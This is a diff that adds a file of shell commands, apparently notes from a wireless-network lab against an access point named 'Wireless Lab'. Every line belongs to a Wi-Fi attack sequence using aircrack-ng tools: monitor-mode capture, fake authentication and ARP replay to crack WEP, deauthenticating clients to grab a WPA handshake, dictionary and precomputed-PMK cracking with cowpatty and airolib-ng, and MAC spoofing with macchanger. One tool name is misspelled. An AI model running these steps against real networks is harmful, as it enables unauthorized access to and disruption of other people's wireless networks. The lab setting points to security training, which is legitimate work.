@@ -1,0 +1,18 @@
+airmon-ng start wlan0
+airodump-ng -c 1 -w capture --bssid DC:EF:09:59:B1:1F wlan0
+airplay-ng -1 1000 -q 10 -e ‘Wireless Lab’ -a DC:EF:09:59:B1:1F -h 00:11:22:33:44:55 wlan0 --ignore-negative-one  
+aireplay-ng -3 -b DC:EF:09:59:B1:1F -h 00:11:22:33:44:55 wlan0
+aircrack-ng capture-01.cap
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -c 11 -w wpacracking --bssid DC:EF:09:59:B1:1F wlan0
+aireplay-ng --deauth 1 -a DC:EF:09:59:B1:1F wlan0 --ignore-negative-one
+aircrack-ng wpacracking-05.cap -w /usr/share/wordlists/nmap.lst
+genpmk -f <chosen wordlist> -d PMK-Wireless-Lab -s “Wireless Lab”
+cowpatty -d PMK-Wireless-Lab -s “Wireless Lab” -r wpacracking-05.cap
+airolib-ng PMK-Aircrack --import cowpatty PMK-Wireless-Lab
+aircrack-ng -r PMK-Aircrack wpacracking-05.cap
+ifconfig wlan0 down
+ifconfig wlan0 up
+macchanger --random wlan0
+macchanger --mac=00:11:22:33:44:55 wlan0
